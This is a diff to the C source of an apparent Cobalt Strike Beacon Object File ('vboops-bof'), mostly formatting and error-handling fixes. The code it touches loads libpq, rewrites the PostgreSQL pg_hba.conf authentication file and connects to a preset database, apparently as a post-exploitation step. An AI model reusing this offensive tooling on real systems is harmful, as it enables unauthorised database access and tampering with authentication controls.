@@ -131,47 +131,47 @@ typedef struct {
 /* Useful BOF functions to replace the ones from CRT */
 SIZE_T bof_strlen(const char *str) {
   SIZE_T len = 0;
-	if (!str)
-		return len;
+  if (!str)
+    return len;
 
-	while (*str++ != '\0')
-		len++;
+  while (*str++ != '\0')
+    len++;
 
-	return len;
+  return len;
 }
 
 void bof_memcpy(void *dst, void *src, SIZE_T len) {
-	unsigned char *pdst = dst;
-	unsigned char *psrc = src;
-	for (SIZE_T i = 0; i < len; i++)
-		*(pdst++) = *(psrc++);
+  unsigned char *pdst = dst;
+  unsigned char *psrc = src;
+  for (SIZE_T i = 0; i < len; i++)
+    *(pdst++) = *(psrc++);
 }
 
 void bof_memset(void *dst, unsigned char v, SIZE_T len) {
-	unsigned char *pdst = dst;
-	for (SIZE_T i = 0; i < len; i++)
-		*(pdst++) = v;
+  unsigned char *pdst = dst;
+  for (SIZE_T i = 0; i < len; i++)
+    *(pdst++) = v;
 }
 
 char* bof_strdup(const char *str) {
-	if (!str)
-		return NULL;
+  if (!str)
+    return NULL;
 
-	SIZE_T len = bof_strlen(str) + 1;
-	char *dup = ALLOC(len);
-	
+  SIZE_T len = bof_strlen(str) + 1;
+  char *dup = ALLOC(len);
+  
   if (!dup)
     return NULL;
 
   bof_memset(dup, 0, len);
-	bof_memcpy((void*)dup, (void*)str, len);
+  bof_memcpy((void*)dup, (void*)str, len);
 
-	return dup;
+  return dup;
 }
 
 /* vboops-bof functions */
 static int vb_path(char **md, const char *root, const char *path, SIZE_T len) {
-  if (!root || !path || len == 0)
+  if (!root || !path)
     return 0;
 
   /* Take a copy of the root so this call can be nested without modifying it mid-call */
@@ -184,6 +184,7 @@ static int vb_path(char **md, const char *root, const char *path, SIZE_T len) {
   
   if (fmt_path.buffer == NULL) {
     FREE(root_copy);
+    BeaconFormatFree(&fmt_path);
     return 0;
   }
 
@@ -200,21 +201,16 @@ static int vb_path(char **md, const char *root, const char *path, SIZE_T len) {
 }
 
 static DWORD vb_libpq_map(libpq_t *pq, char **out_path) {
-  int size = 0;
-  size = vb_path(out_path, PG_ROOT_PATH, PG_DLL_PATH, MAX_PATH);
-
-  if (size <= 0)
+  if (vb_path(out_path, PG_ROOT_PATH, PG_DLL_PATH, MAX_PATH) < 0)
     return ERROR_BAD_LENGTH;
-  
+
   /* Ok broski can't just load the libpq.dll without setting this DLL directory
    * as it has a load of dependencies which can just be loaded from here ezpz :) */
   if (!KERNEL32$SetDllDirectoryA(*out_path))
     return KERNEL32$GetLastError();
 
   char *old = *out_path;
-  size = vb_path(out_path, old, PG_DLL_NAME, MAX_PATH);
-
-  if (size <= 0)
+  if (vb_path(out_path, old, PG_DLL_NAME, MAX_PATH) < 0)
     return ERROR_BAD_LENGTH;
 
   FREE(old);
@@ -245,8 +241,10 @@ static DWORD vb_libpq_map(libpq_t *pq, char **out_path) {
   /* They better have mapped */
   if (!pq->PQlibVersion || !pq->PQconnectdb || !pq->PQstatus ||
       !pq->PQfinish || !pq->PQexec || !pq->PQresultStatus ||
-      !pq->PQntuples || !pq->PQgetvalue)
+      !pq->PQntuples || !pq->PQgetvalue) {
+    KERNEL32$FreeLibrary(pq->__mod);
     return KERNEL32$GetLastError();
+  }
 
   return ERROR_SUCCESS;
 }
@@ -271,7 +269,7 @@ static DWORD vb_base64_decode(const char *enc, unsigned char **dec) {
   if (!CRYPT32$CryptStringToBinaryA(enc, 0, CRYPT_STRING_BASE64,
                                     *dec, &req, NULL, NULL)) {
     FREE(*dec);
-		*dec = NULL;
+    *dec = NULL;
     return 0;
   }
 
@@ -282,8 +280,9 @@ static DWORD vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
   if (!vb_data)
     return 0;
 
-  vb_path(&vb_data->pg_hba_path, PG_ROOT_PATH, PG_CONF_PATH, MAX_PATH); /* Parent struct is FREE'd in go(...)
-                                                                           on error or success */ 
+  if (vb_path(&vb_data->pg_hba_path, PG_ROOT_PATH, PG_CONF_PATH, MAX_PATH) < 0) /* Parent struct is FREE'd in go(...) */
+    return ERROR_BAD_LENGTH;
+
   HANDLE h_conf = KERNEL32$CreateFileA(vb_data->pg_hba_path, GENERIC_READ,
                                        0, NULL,
                                        OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY,
@@ -444,10 +443,16 @@ static int vb_libpq_connect(libpq_t *pq) {
   int fmt_cs_len = 0;
   char *cs; /* PostgreSQL connection string */
   BeaconFormatAlloc(&fmt_cs, cs_len);
+
+  if (fmt_cs.buffer == NULL)
+    return ERROR_NOT_ENOUGH_MEMORY;
+
   BeaconFormatPrintf(&fmt_cs, "host=%s dbname=%s user=%s", PG_HOST, PG_DATABASE, PG_USERNAME);
   cs = BeaconFormatToString(&fmt_cs, &fmt_cs_len);
 
   pq->conn = pq->PQconnectdb(cs);
+
+  BeaconFormatFree(&fmt_cs);
 
   return pq->PQstatus(pq->conn) == (int)PQ_CONNECTION_OK;
 }
